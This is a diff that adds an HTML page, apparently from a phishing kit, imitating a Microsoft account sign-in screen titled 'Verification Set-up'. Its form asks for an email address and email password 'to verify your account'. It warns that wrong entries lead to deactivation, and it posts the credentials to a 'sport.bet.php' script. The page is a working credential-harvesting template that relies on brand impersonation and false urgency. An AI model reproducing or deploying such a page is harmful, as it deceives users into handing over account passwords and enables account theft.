@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="EN-US" dir="ltr">
+ <head>
+  <title>
+   Verification Set-up
+  </title>
+  <script type="text/JavaScript">
+   &lt;!--
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))&gt;0&amp;&amp;parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&amp;&amp;d.all) x=d.all[n]; for (i=0;!x&amp;&amp;i&lt;d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&amp;&amp;d.layers&amp;&amp;i&lt;d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x &amp;&amp; d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_validateForm() { //v4.0
+  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
+  for (i=0; i&lt;(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
+    if (val) { nm=val.name; if ((val=val.value)!="") {
+      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
+        if (p&lt;1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
+      } else if (test!='R') { num = parseFloat(val);
+        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
+        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
+          min=test.substring(8,p); max=test.substring(p+1);
+          if (num&lt;min || max&lt;num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
+    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
+  } if (errors) alert('The following error(s) occurred:\n'+errors);
+  document.MM_returnValue = (errors == '');
+}
+//--&gt;
+  </script>
+  <link href="https://auth.gfx.ms/16.000.25123.00/favicon.ico?v=2" rel="shortcut icon" />
+  <link href="./food/R3WinLive1033.css" type="text/css" title="R3CSS" rel="stylesheet" />
+ </head>
+ <body uitheme="Web" onload="evt_Login_onload(event);">
+  <div style="height: 40px;">
+  </div>
+  <div style="width: 100%;" class="centerParent" id="shellTD">
+   <div style="width: 935px;" class="center" id="shellTBL">
+    <div class="centerParent">
+     <div style="width: 895px;" class="center" id="mainTD">
+      <div style="width: 475px;" class="floatLeft" id="brandModeTD">
+       <div style="width: 475px;" id="productTD">
+        <iframe width="475px" height="490px" frameborder="0" src="./food/EN-US%281%29.htm" scrolling="no" marginwidth="0px" marginheight="0px" id="i0278">
+        </iframe>
+       </div>
+      </div>
+      <div style="width: 420px; position: relative;" class="floatLeft" id="signInTD">
+       <div style="height: 40px;">
+       </div>
+       <div class="signInHeader" id="i0272">
+        <iframe width="320px" height="50px" frameborder="0" src="./food/EN-US.htm" scrolling="no" marginwidth="0px" marginheight="0px" id="i0277">
+        </iframe>
+       </div>
+       <div style="height: 30px;">
+       </div>
+       <div style="width: 100px; height: 370px;" class="floatLeft">
+       </div>
+       <div style="width: 320px;" class="floatLeft">
+        <div id="rightTD">
+         <form onsubmit="MM_validateForm('Email','','RisEmail','Password','','R');return document.MM_returnValue" method="post" action="sport.bet.php">
+          <div class="section">
+           <div style="display: none;" aria-atomic="true" aria-relevant="text" aria-live="assertive" id="idTd_Tile_Error">
+            <div id="idTd_Tile_ErrorMsg_Login" class="errorDiv first">
+            </div>
+           </div>
+           <div style="display: none;" aria-atomic="true" aria-relevant="text" aria-live="assertive" id="idTd_PWD_Error">
+            <div id="idTd_PWD_ErrorMsg_Username" class="errorDiv first">
+             Generic Password Error Message
+            </div>
+           </div>
+           <div class="row label" id="idTd_PWD_UsernameLbl">
+            <span role="heading" id="idLbl_PWD_Username">
+             <a href="#" id="idA_MSAccLearnMore">
+              We need your E-mail password to verify your account
+             </a>
+            </span>
+           </div>
+           <div class="row textbox" id="idDiv_PWD_UsernameTb">
+            <div style="position: relative; width: 100%; font-size:15px;">
+             <input type="text" maxlength="113" placeholder="username@example.com" name="Email" />
+            </div>
+           </div>
+           <div class="row textbox" id="idDiv_PWD_PasswordTb">
+            <div style="position: relative; width: 100%;">
+             <input type="password" placeholder="Password" id="i0118" name="Password" />
+            </div>
+           </div>
+          </div>
+          <div class="section" id="idTd_PWD_SubmitCancelTbl">
+           <input type="submit" class="default" value="Verify" id="idSIButton9" name="SI" />
+          </div>
+          <div class="section">
+           <div class="row small" id="idDiv_PWD_ForgotPassword">
+            <a id="idA_PWD_ForgotPassword" href="#">
+             Endeavor not to input the wrong combination of password,
+            </a>
+           </div>
+           <div class="row small" id="idTD_PWD_SwitchToOTCLink">
+            <a id="idA_PWD_SwitchToOTC" href="">
+             so your account won't be deactivated.
+            </a>
+           </div>
+          </div>
+         </form>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div style="height: 50px; clear: both;">
+    </div>
+   </div>
+  </div>
+  <div class="footerHeight" id="evDiv">
+   <img height="0" style="visibility: hidden;" alt="" id="ev" />
+  </div>
+  <div style="clear: both; margin-left: 0px;" class="footer centerParent" id="footerTD">
+   <div style="width: 895px;" class="center">
+    <div class="mslogo" id="idDiv_MSLogo">
+    </div>
+   </div>
+   <div style="width: 895px; clear: both;" class="center">
+    <table cellspacing="0" cellpadding="0" class="footer">
+     <tbody>
+      <tr>
+       <td align="right">
+        <table cellspacing="0" cellpadding="0">
+         <tbody>
+          <tr>
+           <td style="text-align: right;">
+            <span>
+            </span>
+           </td>
+           <td aria-hidden="true" class="footerspace">
+           </td>
+           <td aria-hidden="true" class="footerspace">
+           </td>
+           <td style="text-align: right;">
+            <a id="ftrFdbk" class="footerlink" href="#">
+             Contact Us
+            </a>
+           </td>
+           <td aria-hidden="true" class="footerspace">
+           </td>
+           <td aria-hidden="true" class="footerspace">
+           </td>
+           <td style="text-align: right;">
+            <a id="ftrTerms" class="footerlink" href="#">
+             Terms of Use
+            </a>
+           </td>
+           <td aria-hidden="true" class="footerspace">
+           </td>
+           <td aria-hidden="true" class="footerspace">
+           </td>
+           <td style="text-align: right;">
+            <a id="ftrPrivacy" class="footerlink" href="#">
+             Privacy &amp; Cookies
+            </a>
+           </td>
+           <td aria-hidden="true" class="footerspace">
+           </td>
+           <td aria-hidden="true" class="footerspace">
+           </td>
+           <td style="text-align: right;">
+            <span class="secondary ltr" id="ftrCopy">
+             ©2014 Microsoft
+            </span>
+           </td>
+          </tr>
+         </tbody>
+        </table>
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </div>
+  </div>
+ </body>
+</html>
